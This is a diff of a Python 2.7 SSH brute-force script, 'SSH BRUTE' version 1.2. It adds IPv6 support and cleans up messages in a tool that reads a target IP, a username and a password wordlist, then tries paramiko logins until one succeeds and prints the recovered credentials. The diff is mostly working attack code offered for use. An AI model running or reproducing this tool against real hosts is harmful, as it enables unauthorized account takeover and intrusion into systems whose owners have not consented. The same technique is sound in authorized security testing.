@@ -1,11 +1,13 @@
 #!/usr/bin/python
 #
 # Author ScianKabestia
-# Version 1.1
+# Version 1.2
 # Python 2.7.x
-# DESCRIPTION: Simple ssh brute from Wordlist
-# Requirements termcolor, paramiko 
-# "pip install termcolor"; pip install paramiko
+# DESCRIPTION: SSH Bruteforce from Wordlist File for IPv4 & IPv6
+#              Added Support for IPv6
+#
+# Requirements: termcolor, paramiko 
+#               pip install termcolor && pip install paramiko
 # 
 
 import paramiko
@@ -14,28 +16,33 @@ import sys
 import os
 import socket
 from termcolor import *
-global host, username, input_file, line #global variables
+global host, username, input_file, line
+# Global Variables
 
 line = "\n--------------------------------------\n"
 
 print "------------------------------"
 print (colored("<<< [+] SSH BRUTE >>>",'yellow'))
+print          "        IPv4 & IPv6  "
 print "Author: ScianKaBestia"
-print "Version: 1.1"
+print "Version: 1.2"
 print "------------------------------\n"
 
-try:
-	host= raw_input (colored("[+] Enter Target IP: " ,'blue'))# just banner
-	username= raw_input(colored("[+] Enter SSH Username: ",'blue'))#just banner
-	input_file= raw_input(colored("[+] Enter Wordlist path: ", 'blue'))# just banner
-	print ("[*] LOADING LIST..... ;)")#just banner
+# Description
+try:    
+	print                    "WARNING: for IPv6 use %interface"
+	print                    "EXAMPLE: fe80::a00:27ff:fee0:8b72%eth0"
+	host= raw_input (colored(     "[+] Enter Target IP: " ,'blue'))
+	username= raw_input(colored(  "[+] Enter SSH Username: ",'blue'))
+	input_file= raw_input(colored("[+] Enter Wordlist path: ", 'blue'))
+	print                         "[*]... Loading List ..... " 
 
 	if os.path.exists(input_file)== False:
 		print (colored("\n[-] File Path Doesn't Exist!",'red'))
 		sys.exit(4)
 
 except KeyboardInterrupt:# if user press Ctrl+c 
-	print (colored("\n\n[*] Process Stopped", 'red'))
+	print (colored("\n\n[*] PROCESS STOPPED", 'red'))
 	sys.exit(3)
 
 def ssh_connect(password, code=0): #[+] Connection Established
@@ -61,18 +68,17 @@ for i in input_file.readlines():
 		response=ssh_connect(password)
 
 		if response==0: #[+]Connection Established
-			print(colored("%s[+]User: %s [+]Password Found: %s [+]Target: %s%s" %(line ,username, password, host, line),'green'))
+			print(colored("%s[+] USER: %s [+] PASSWORD FOUND: %s [+] TARGET: %s%s" %(line ,username, password, host, line),'green'))
 			print(colored("SSH Login - [ssh user@IP]",'grey'))#Print values,
 			sys.exit(0)
 		elif response==1: #[!]Authentication Failed
-			print(colored("[?] User: %s [?] Tryng Password: %s  Login Incorrect!" %(username,password),'yellow'))
+			print(colored("[?] USER: %s [?] TRYING PASSWORD: %s [!]LOGIN INCORRECT" %(username,password),'yellow'))
 		elif response==2: #[!]Connection Refused
-			print(colored("[?] Unbale to Connect to Target: %s ,maybe Host is Down or there is a Firewall in place" %(host),'yellow'))
+			print(colored("[ERROR] COULDN'T CONNECT TO HOST: %s ; IS DOWN OR FIREWALL IN PLACE" %(host),'yellow'))
 			sys.exit(2)
 			
 	except KeyboardInterrupt:# If user press Ctrl+c
-		print (colored("\n\n[*] Process Stopped By User",'red'))
-		print(colored("[+] See You ;)"))
+		print (colored("\n\n[*] PROCESS STOPPED",'red'))
 		sys.exit(3)
 	except Exception, e:
 	    print e
